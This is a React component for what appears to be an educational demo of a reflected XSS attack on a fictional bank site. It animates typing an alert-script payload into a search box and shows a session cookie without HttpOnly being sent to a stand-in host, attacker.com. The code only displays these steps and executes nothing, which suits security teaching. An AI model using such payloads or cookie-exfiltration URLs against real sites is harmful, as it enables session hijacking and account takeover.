import React, { useEffect, useState } from 'react';

interface Props { currentScreen: string; onInteraction?: (action: string) => void; }

function BrowserChrome({ url, children }: { url: string; children: React.ReactNode }) {
    return (
        <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
            <div style={{ background: '#e2e8f0', padding: '8px 14px', display: 'flex', alignItems: 'center', gap: 12, flexShrink: 0, borderBottom: '1px solid #cbd5e1' }}>
                <div style={{ display: 'flex', gap: 6 }}>
                    {['#ff5f57','#ffbd2e','#28ca41'].map(c => <span key={c} style={{ display:'inline-block', width:12, height:12, borderRadius:'50%', background:c }} />)}
                </div>
                <div style={{ flex:1, background:'#f8fafc', padding:'4px 12px', borderRadius:4, fontSize:'0.78rem', fontFamily:'sans-serif', color:'#334155', display:'flex', alignItems:'center', gap:6 }}>
                    🔒 {url}
                </div>
            </div>
            <div style={{ flex: 1, overflowY: 'auto' }}>{children}</div>
        </div>
    );
}

function CorpBankPage({ highlight, typedScript, onInteraction }: { highlight?: boolean; typedScript?: string; onInteraction?: (action: string) => void }) {
    return (
        <div style={{ background: '#fff', minHeight: '100%', fontFamily: 'sans-serif' }}>
            {/* Nav */}
            <div style={{ background: '#1e3a8a', padding: '12px 20px', display: 'flex', alignItems: 'center', justifyContent: 'space-between', color: '#fff' }}>
                <b style={{ fontFamily:"'Orbitron',sans-serif", letterSpacing:1 }}>CORPBANK</b>
                <div style={{ display: 'flex', gap: 16, fontSize: '0.8rem', opacity: 0.8 }}>
                    <span>Home</span><span>Accounts</span><span>Support</span>
                </div>
            </div>
            {/* Search bar */}
            <div style={{ padding: '20px 24px', background: '#f8fafc', borderBottom: '1px solid #e2e8f0' }}>
                <div style={{ maxWidth: 460, margin: '0 auto', position: 'relative', display: 'flex', gap: 8 }}>
                    <input
                        readOnly
                        value={typedScript ?? ''}
                        placeholder="Search transactions, statements..."
                        style={{
                            flex: 1,
                            padding: '11px 16px',
                            border: highlight ? '2px solid #f59e0b' : '1px solid #cbd5e1',
                            borderRadius: 8,
                            fontSize: '0.9rem',
                            boxSizing: 'border-box',
                            boxShadow: highlight ? '0 0 0 4px rgba(245,158,11,0.15)' : 'none',
                            color: typedScript ? '#e11d48' : '#334155',
                            fontFamily: typedScript ? "'Share Tech Mono',monospace" : 'sans-serif',
                            transition: 'all 0.3s',
                        }}
                    />
                    <button 
                        onClick={() => onInteraction?.('search-submit')}
                        style={{ background: '#3b82f6', color: '#fff', border: 'none', padding: '0 16px', borderRadius: 8, cursor: 'pointer', fontWeight: 700 }}
                    >
                        Search
                    </button>
                </div>
            </div>
            {/* News section */}
            <div style={{ padding: '20px 24px' }}>
                <div style={{ fontSize: '0.8rem', color: '#94a3b8', marginBottom: 12 }}>RECENT ANNOUNCEMENTS</div>
                {['Q1 Interest rates updated — learn more','New mobile app available — download now','Security reminder: never share your password'].map(n => (
                    <div key={n} style={{ padding: '10px 0', borderBottom: '1px solid #f1f5f9', fontSize: '0.85rem', color: '#334155' }}>📌 {n}</div>
                ))}
            </div>
        </div>
    );
}

export default function XssploitVictim({ currentScreen, onInteraction }: Props) {

    /* typing animation for input-testing */
    const payload = "<script>alert('XSS')</script>";
    const [typed, setTyped] = useState('');
    useEffect(() => {
        if (currentScreen !== 'input-testing') { setTyped(''); return; }
        let i = 0;
        const id = setInterval(() => {
            i++;
            setTyped(payload.slice(0, i));
            if (i >= payload.length) clearInterval(id);
        }, 80);
        return () => clearInterval(id);
    }, [currentScreen]);

    /* ── BROWSER-NORMAL ── */
    if (currentScreen === 'browser-normal') return (
        <BrowserChrome url="https://corpbank.com/search">
            <CorpBankPage onInteraction={onInteraction} />
        </BrowserChrome>
    );

    /* ── INPUT-TESTING ── */
    if (currentScreen === 'input-testing') return (
        <BrowserChrome url="https://corpbank.com/search">
            <CorpBankPage highlight typedScript={typed} onInteraction={onInteraction} />
        </BrowserChrome>
    );

    /* ── ALERT-POPUP ── */
    if (currentScreen === 'alert-popup') return (
        <BrowserChrome url="https://corpbank.com/search">
            <div style={{ position: 'relative' }}>
                <div style={{ filter: 'brightness(0.6)' }}>
                    <CorpBankPage typedScript={payload} highlight onInteraction={onInteraction} />
                </div>
                {/* JS alert dialog */}
                <div style={{ position: 'absolute', top: '30%', left: '50%', transform: 'translate(-50%,-50%)', background: '#f5f5f5', border: '2px solid #aaa', borderRadius: 8, width: 280, boxShadow: '0 8px 32px rgba(0,0,0,0.4)', fontFamily: 'sans-serif', overflow: 'hidden' }}>
                    <div style={{ background: '#e8e8e8', padding: '8px 14px', borderBottom: '1px solid #ccc', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                        <span style={{ fontSize: '0.8rem', color: '#555' }}>corpbank.com says:</span>
                        <span style={{ fontSize: '0.9rem', cursor: 'pointer', color: '#333' }} onClick={() => onInteraction?.('close-alert')}>✕</span>
                    </div>
                    <div style={{ padding: '24px 20px', textAlign: 'center' }}>
                        <div style={{ fontSize: '2rem', marginBottom: 8 }}>⚠️</div>
                        <div style={{ fontSize: '1.6rem', fontWeight: 900, color: '#e11d48', marginBottom: 16, fontFamily:"'Share Tech Mono',monospace" }}>XSS</div>
                        <button 
                            onClick={() => onInteraction?.('close-alert')}
                            style={{ padding: '8px 36px', background: '#3b82f6', color: '#fff', border: 'none', borderRadius: 4, cursor: 'pointer', fontWeight: 700 }}
                        >
                            OK
                        </button>
                    </div>
                </div>
            </div>
        </BrowserChrome>
    );

    /* ── COOKIE-STOLEN ── */
    if (currentScreen === 'cookie-stolen') return (
        <BrowserChrome url="https://corpbank.com/search">
            <div style={{ display: 'flex', flexDirection: 'column', height: '100%' }}>
                {/* page above */}
                <div style={{ flex: 1, filter: 'brightness(0.7)' }}>
                    <CorpBankPage onInteraction={onInteraction} />
                </div>
                {/* DevTools panel */}
                <div style={{ height: 200, background: '#1e1e2e', borderTop: '2px solid #00d4ff', fontFamily:"'Share Tech Mono',monospace", fontSize: '0.7rem', display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
                    {/* DevTools tab bar */}
                    <div style={{ background: '#161625', display: 'flex', gap: 0, borderBottom: '1px solid #333', padding: '0 8px' }}>
                        {['Elements','Console','Network','Application'].map((t,i) => (
                            <div key={t} style={{ padding: '6px 14px', color: i === 3 ? '#00d4ff' : '#6b7280', borderBottom: i === 3 ? '2px solid #00d4ff' : 'none', fontSize: '0.72rem' }}>{t}</div>
                        ))}
                    </div>
                    <div style={{ flex: 1, padding: '10px 14px', overflowY: 'auto', color: '#c8e6f0' }}>
                        <div style={{ color: '#6b86a0', marginBottom: 6, fontSize: '0.68rem' }}>▶ Storage &gt; Cookies &gt; corpbank.com</div>
                        <div style={{ display: 'grid', gridTemplateColumns: '120px 1fr 60px 60px', gap: 6, color: '#6b86a0', borderBottom: '1px solid rgba(255,255,255,0.08)', paddingBottom: 4, marginBottom: 4, fontSize: '0.67rem' }}>
                            <span>Name</span><span>Value</span><span>HttpOnly</span><span>Secure</span>
                        </div>
                        <div style={{ display: 'grid', gridTemplateColumns: '120px 1fr 60px 60px', gap: 6, background: 'rgba(255,68,68,0.1)', padding: '5px 4px', borderRadius: 4, border: '1px solid rgba(255,68,68,0.3)', fontSize: '0.67rem' }}>
                            <span style={{ color: '#bb88ff' }}>PHPSESSID</span>
                            <span style={{ color: '#fbbf24', animation: 'pulse 1s infinite' }}>abc123def456xyz789</span>
                            <span style={{ color: '#ff4444' }}>✗</span>
                            <span style={{ color: '#ff4444' }}>✗</span>
                        </div>
                        <div style={{ marginTop: 10, color: '#ff4444', fontSize: '0.68rem', display: 'flex', alignItems: 'center', gap: 8 }}>
                            <span style={{ animation: 'pulse 0.8s infinite' }}>▶▶</span>
                            <span>Cookie being sent to: http://attacker.com/?c=abc123def456xyz789</span>
                        </div>
                    </div>
                </div>
            </div>
        </BrowserChrome>
    );

    /* ── COMPROMISED ── */
    return (
        <div style={{ flex:1, background:'#0a0a1a', display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', gap:14, padding:24 }}>
            <div style={{ fontSize:'5rem', lineHeight:1 }}>🍪</div>
            <div style={{ fontFamily:"'Orbitron',sans-serif", fontSize:'0.9rem', color:'#ff4444', letterSpacing:2 }}>SESSION STOLEN VIA XSS</div>
            <div style={{ background:'rgba(255,68,68,0.08)', border:'1px solid rgba(255,68,68,0.3)', borderRadius:10, padding:16, width:'90%', maxWidth:300 }}>
                {[['Attack type','Reflected XSS'],['Cookie stolen','PHPSESSID'],['HttpOnly','Not set (vulnerable)'],['Account access','Full — no password needed']].map(([k,v]) => (
                    <div key={k} style={{ display:'flex', justifyContent:'space-between', padding:'5px 0', borderBottom:'1px solid rgba(255,255,255,0.05)', fontFamily:"'Share Tech Mono',monospace", fontSize:'0.74rem' }}>
                        <span style={{ color:'rgba(255,255,255,0.4)' }}>{k}:</span>
                        <span style={{ color:'#ff4444' }}>{v}</span>
                    </div>
                ))}
            </div>
        </div>
    );
}
